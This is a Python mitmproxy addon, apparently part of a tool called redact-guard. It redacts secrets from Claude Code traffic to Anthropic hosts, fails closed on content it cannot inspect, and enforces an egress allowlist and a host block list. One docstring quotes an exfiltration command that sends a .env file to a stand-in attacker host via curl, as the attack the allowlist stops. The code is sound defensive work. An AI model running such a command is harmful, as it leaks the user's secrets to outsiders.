"""mitmproxy addon: redact-guard as an HTTPS proxy ("proxy mode").

Claude Code talks to api.anthropic.com as usual (so Remote Control stays
available) but through HTTPS_PROXY. This addon terminates TLS only for
Anthropic/Claude hosts and:

* /v1/messages, /v1/messages/count_tokens: same redaction + streaming restore
  as the gateway (engine.py / sse.py), fail-closed;
* any other request body to those hosts (Remote Control session sync,
  feature flags, telemetry...): uplink redaction (uplink.py), fail-closed;
* WebSocket frames from Claude Code to those hosts (Remote Control): uplink
  redaction per NDJSON line; a frame that can't be inspected or trips the
  canary kills the connection;
* auth endpoints and Claude Code's own credentials: untouched;
* everything else (npm, GitHub, ...): blind TCP tunnel, never decrypted.

Run it with `python -m redact_guard proxy`.
"""
from __future__ import annotations

import json
import logging
import os
import re
import time

from mitmproxy import http

from . import config as C
from . import healthproof
from .__main__ import build_redactor
from .engine import LeakDetected
from .sse import StreamRestorer
from .uplink import AUTH_PATH_RE, Uninspectable, UplinkRedactor

log = logging.getLogger("redact_guard.proxy")

ANTHROPIC_HOST_RE = re.compile(r"(?i)(?:^|\.)(?:anthropic\.com|claude\.ai|claude\.com)$")
MESSAGES_PATHS = {"/v1/messages", "/v1/messages/count_tokens"}
HEALTH_HOST = "redact-guard.invalid"
DEFAULT_BLOCK_HOSTS = ("datadoghq.com", "datadoghq.eu", "sentry.io", "ingest.sentry.io")


def _err(status: int, msg: str) -> http.Response:
    return http.Response.make(status, json.dumps({"type": "error", "error": {
        "type": "api_error", "message": msg}}), {"Content-Type": "application/json"})



SESSION_PATH_RE = re.compile(r"^/v1/(?:code/)?sessions/([A-Za-z0-9_\-]+)")
_TYPE_RE = re.compile(rb'"type"\s*:\s*"([A-Za-z0-9_.\-]{1,40})"')
_QUIET_TYPES = re.compile(r"(?i)ping|keep_?alive|heartbeat")


def _types(data: bytes, limit: int = 8) -> list[str]:
    """Message type names only (never content), for the downlink trace."""
    out: list[str] = []
    for m in _TYPE_RE.finditer(data[:65536]):
        name = m.group(1).decode()
        if name not in out:
            out.append(name)
        if len(out) >= limit:
            break
    return out


def _rechunk(flow: http.HTTPFlow) -> None:
    """Restoring tokens changes the body's length. mitmproxy forwards the upstream headers as
    they are, so a Content-Length (sent when something upstream collected the whole stream)
    would no longer match: the client then waits for bytes that never come, or reads the
    surplus as the start of the next reply, and the connection hangs. Send the body chunked
    instead (HTTP/2 needs no length at all)."""
    h = flow.response.headers
    if "content-length" not in h:
        return
    del h["content-length"]
    if flow.request.http_version.upper().startswith("HTTP/1"):
        h["transfer-encoding"] = "chunked"

class RedactGuardAddon:
    def __init__(self):
        cfg_path = os.environ.get("REDACT_GUARD_CONFIG") or None
        self.settings = C.load(cfg_path)
        self.health_secret = healthproof.load(self.settings.hook_secret_file, create=True)
        self.redactor = build_redactor(self.settings,
                                       ephemeral=os.environ.get("REDACT_GUARD_EPHEMERAL") == "1")
        self.uplink = UplinkRedactor(self.redactor, binary=self.settings.engine.binary_blocks)
        self.test_upstream = os.environ.get("REDACT_GUARD_TEST_UPSTREAM")  # tests only
        self.block_hosts = tuple(DEFAULT_BLOCK_HOSTS)
        self.uninspectable = os.environ.get("REDACT_GUARD_UNINSPECTABLE", "block")
        self.egress = None
        if self.settings.egress_enabled:
            from .egress import EgressProxy
            self.egress = EgressProxy(self.settings.egress_allow, self.settings.egress_ports)
        self.audit = None
        if self.settings.audit_log:
            self.settings.audit_log.parent.mkdir(parents=True, exist_ok=True)
            self.audit = open(self.settings.audit_log, "a", encoding="utf-8")

    def _audit(self, **rec):
        rec["ts"] = round(time.time(), 3)
        rec["mode"] = "proxy"
        line = json.dumps(rec, ensure_ascii=False)
        log.info(line)
        if self.audit:
            self.audit.write(line + "\n")
            self.audit.flush()

    # ------------------------------------------------------------ connect
    def _egress_ok(self, host: str, port: int) -> bool:
        """With egress.enabled, everything that isn't Anthropic (redacted here) must be on the
        allowlist: shell commands inherit HTTPS_PROXY from Claude Code's settings, so this is
        what stops `curl https://attacker/?d=$(cat .env)` through the proxy."""
        if not self.egress:
            return True
        if ANTHROPIC_HOST_RE.search(host) or host == HEALTH_HOST:
            return True
        return self.egress.allowed(host, port)

    def http_connect(self, flow: http.HTTPFlow) -> None:
        host = flow.request.host.lower()
        if any(host == b or host.endswith("." + b) for b in self.block_hosts):
            self._audit(event="blocked_host", host=host)
            flow.response = http.Response.make(403, b"blocked by redact-guard")
            return
        if not self._egress_ok(host, flow.request.port):
            self._audit(event="egress_denied", host=host, port=flow.request.port)
            flow.response = http.Response.make(403, b"redact-guard: host not on the egress allowlist")

    # ------------------------------------------------------------ request
    def request(self, flow: http.HTTPFlow) -> None:
        host = flow.request.pretty_host.lower()
        if host == HEALTH_HOST:
            from . import __version__
            out = {"ok": True, "service": "redact-guard", "mode": "proxy", "version": __version__,
                   "vault_entries": len(self.redactor.vault)}
            nonce = flow.request.query.get("nonce")
            if nonce and self.health_secret:
                out["proof"] = healthproof.proof(self.health_secret, nonce)
            flow.response = http.Response.make(200, json.dumps(out), {"Content-Type": "application/json"})
            return
        if not self._egress_ok(host, flow.request.port):     # plain-HTTP proxy requests
            self._audit(event="egress_denied", host=host, port=flow.request.port)
            flow.response = http.Response.make(403, b"redact-guard: host not on the egress allowlist")
            return
        if not ANTHROPIC_HOST_RE.search(host):
            return
        path = flow.request.path.split("?", 1)[0]
        try:
            if flow.request.method == "POST" and path in MESSAGES_PATHS:
                body = json.loads(flow.request.get_content() or b"{}")
                body, stats = self.redactor.redact_request(body)
                flow.request.set_content(json.dumps(body, ensure_ascii=False,
                                                    separators=(",", ":")).encode())
                flow.request.headers["accept-encoding"] = "identity"
                flow.metadata["rg_messages"] = True
                flow.metadata["rg_t0"] = time.monotonic()
                self._audit(event="request", path=path, **stats.as_dict())
            elif AUTH_PATH_RE.search(path):
                self._audit(event="auth_passthrough", host=host, path=path)
            elif flow.request.raw_content:
                ct = flow.request.headers.get("content-type", "")
                try:
                    new = self.uplink.body(flow.request.get_content(), ct)
                    flow.request.set_content(new)
                    self._audit(event="uplink", host=host, path=path, bytes=len(new))
                except Uninspectable as e:
                    # "pass" is only for genuinely binary bodies: a text body that failed to
                    # parse may be full of real values and is never forwarded as-is
                    if self.uninspectable == "pass" and e.binary:
                        self._audit(event="uplink_uninspected_passed", host=host, path=path)
                    else:
                        self._audit(event="uplink_refused", host=host, path=path, reason=str(e))
                        flow.response = _err(403, f"redact-guard refused an upload it can't "
                                                  f"inspect ({e})")
                        return
        except LeakDetected as e:
            self._audit(event="canary_blocked", host=host, path=path, reason=str(e))
            flow.response = _err(500, f"redact-guard refused to forward: {e}")
            return
        except Exception as e:  # fail closed
            log.exception("redaction failed")
            self._audit(event="redaction_error", host=host, path=path, error=type(e).__name__)
            flow.response = _err(500, f"redact-guard: redaction failed ({type(e).__name__}); "
                                      f"request was NOT forwarded")
            return
        if self.test_upstream:
            from urllib.parse import urlparse
            u = urlparse(self.test_upstream)
            flow.request.scheme, flow.request.host = u.scheme, u.hostname
            flow.request.port = u.port or (443 if u.scheme == "https" else 80)
            flow.request.headers["host"] = host

    # ----------------------------------------------------------- response
    def _timing(self, flow: http.HTTPFlow, outcome: str) -> None:
        """Timing of model replies, for diagnosing slow or stalled streams (corporate proxies
        that buffer or cut long responses). Only durations and sizes, never content."""
        t0 = flow.metadata.get("rg_t0")
        if t0 is None:
            return
        now = time.monotonic()
        self._audit(event="model_response", outcome=outcome,
                    status=flow.response.status_code if flow.response else None,
                    first_byte_ms=round((flow.metadata.get("rg_t1", now) - t0) * 1000),
                    total_ms=round((now - t0) * 1000),
                    streamed=bool(flow.response and flow.response.stream),
                    out_bytes=flow.metadata.get("rg_bytes"),
                    longest_gap_ms=round(flow.metadata.get("rg_gap", 0.0) * 1000))

    def error(self, flow: http.HTTPFlow) -> None:
        # the upstream connection failed or was cut mid-reply
        self._timing(flow, f"error: {type(flow.error).__name__ if flow.error else 'unknown'}"
                           f" {(flow.error.msg if flow.error else '')[:80]}")

    def responseheaders(self, flow: http.HTTPFlow) -> None:  # noqa: C901
        if "rg_t0" in flow.metadata:
            flow.metadata["rg_t1"] = time.monotonic()
            r = flow.response
            sc = flow.server_conn
            self._audit(event="model_stream_start", status=r.status_code if r else None,
                        http_version=r.http_version if r else None,
                        upstream_alpn=(sc.alpn.decode() if sc and sc.alpn else None),
                        content_type=(r.headers.get("content-type", "") if r else "")[:40],
                        transfer=(r.headers.get("transfer-encoding") or
                                  ("length" if r and "content-length" in r.headers else "none")) if r else None,
                        first_byte_ms=round((flow.metadata["rg_t1"] - flow.metadata["rg_t0"]) * 1000))
        if flow.response is None:
            return
        ctype = flow.response.headers.get("content-type", "")
        if "text/event-stream" not in ctype:
            return
        if flow.metadata.get("rg_messages") and flow.response.status_code == 200:
            enc = flow.response.headers.get("content-encoding", "identity").lower()
            if enc not in ("", "identity"):
                # we asked for identity; a compressed stream can't be restored or policy-checked
                self._audit(event="response_refused", reason=f"content-encoding {enc}")
                flow.response = _err(502, "redact-guard: compressed model stream can't be inspected")
                return
            restorer = StreamRestorer(self.redactor)
            _rechunk(flow)

            meta = flow.metadata

            def stream(chunk: bytes) -> bytes:
                if chunk:
                    meta["rg_bytes"] = meta.get("rg_bytes", 0) + len(chunk)
                    # longest silence between chunks: a buffering/stalling proxy shows up here
                    now = time.monotonic()
                    meta["rg_gap"] = max(meta.get("rg_gap", 0.0), now - meta.get("rg_last", now))
                    meta["rg_last"] = now
                    if b"message_stop" in chunk and not meta.get("rg_stop"):
                        meta["rg_stop"] = now
                        self._audit(event="model_message_stop",
                                    after_ms=round((now - meta["rg_t0"]) * 1000),
                                    bytes=meta["rg_bytes"])
                    out = restorer.feed(chunk)
                    # an empty chunk would be sent as the chunked end marker and cut the reply
                    return [out] if out else []
                out = restorer.flush()
                if restorer.stats.blocked_tools:
                    self._audit(event="response_blocked_tools", tools=restorer.stats.blocked_tools)
                return out
            flow.response.stream = stream
        else:
            # long-lived streams (e.g. Remote Control downlink): never buffer, never modify
            sm = SESSION_PATH_RE.match(flow.request.path)
            if sm and ANTHROPIC_HOST_RE.search(flow.request.pretty_host.lower()):
                self._audit(event="downlink_open", session=sm.group(1)[-12:],
                            path=flow.request.path.split("?", 1)[0].rsplit("/", 1)[-1],
                            encoding=flow.response.headers.get("content-encoding", "identity"))
                flow.response.stream = self._downlink_tap(sm.group(1), flow.request.path)
            else:
                flow.response.stream = True

    def _downlink(self, session: str, path: str, data: bytes, via: str) -> None:
        types = [x for x in _types(data) if not _QUIET_TYPES.search(x)]
        if types:
            self._audit(event="downlink", via=via, session=session[-12:],
                        path=path.split("?", 1)[0].rsplit("/", 1)[-1], bytes=len(data), types=types)

    def _downlink_tap(self, session: str, path: str):
        """What arrives from your phone (messages, permission answers) passes through
        unchanged; the audit log gets its type names, so you can see whether it reached
        this machine."""
        buf = bytearray()

        def tap(chunk: bytes):
            if not chunk:
                return b""
            buf.extend(chunk)
            while True:
                end = buf.find(b"\n\n")
                if end < 0:
                    if len(buf) > 262144:
                        del buf[:-65536]
                    break
                self._downlink(session, path, bytes(buf[:end]), "stream")
                del buf[:end + 2]
            return [chunk]
        return tap

    def response(self, flow: http.HTTPFlow) -> None:
        if flow.response is not None and not flow.metadata.get("rg_messages") \
                and not flow.response.stream and flow.request.method == "GET":
            sm = SESSION_PATH_RE.match(flow.request.path)
            if sm and ANTHROPIC_HOST_RE.search(flow.request.pretty_host.lower()):
                try:
                    data = flow.response.get_content() or b""
                except ValueError:
                    data = flow.response.raw_content or b""
                self._downlink(sm.group(1), flow.request.path, data, "poll")
        if not flow.metadata.get("rg_messages") or flow.response is None:
            return
        self._timing(flow, "complete")
        if flow.response.stream:
            return
        if flow.response.status_code == 200 and "json" in flow.response.headers.get("content-type", "") \
                and flow.request.path.split("?", 1)[0] == "/v1/messages":
            try:
                data = json.loads(flow.response.get_content())
                flow.response.set_content(json.dumps(
                    self.redactor.process_response_json(data), ensure_ascii=False).encode())
            except Exception as e:
                # fail closed: an unchecked response could carry a database command
                self._audit(event="response_refused", reason=type(e).__name__)
                flow.response = _err(502, "redact-guard: model response couldn't be checked")

    # ----------------------------------------------------------- websocket
    def websocket_message(self, flow: http.HTTPFlow) -> None:
        assert flow.websocket is not None
        msg = flow.websocket.messages[-1]
        host = flow.request.pretty_host.lower()
        if not ANTHROPIC_HOST_RE.search(host):
            return
        if not msg.from_client:
            sm = SESSION_PATH_RE.match(flow.request.path)
            self._downlink(sm.group(1) if sm else "?", flow.request.path,
                           msg.content if isinstance(msg.content, bytes) else b"", "ws")
            return
        try:
            if not msg.is_text:
                raise Uninspectable("binary WebSocket frame can't be inspected", binary=True)
            msg.text = self.uplink.ws_text(msg.text)
        except (Uninspectable, LeakDetected) as e:
            self._audit(event="ws_frame_refused", host=host, path=flow.request.path, reason=str(e))
            msg.drop()
            flow.kill()
        except Exception as e:  # never log the message: it may quote content
            self._audit(event="ws_frame_refused", host=host, path=flow.request.path, error=type(e).__name__)
            msg.drop()
            flow.kill()


addons = [RedactGuardAddon()]
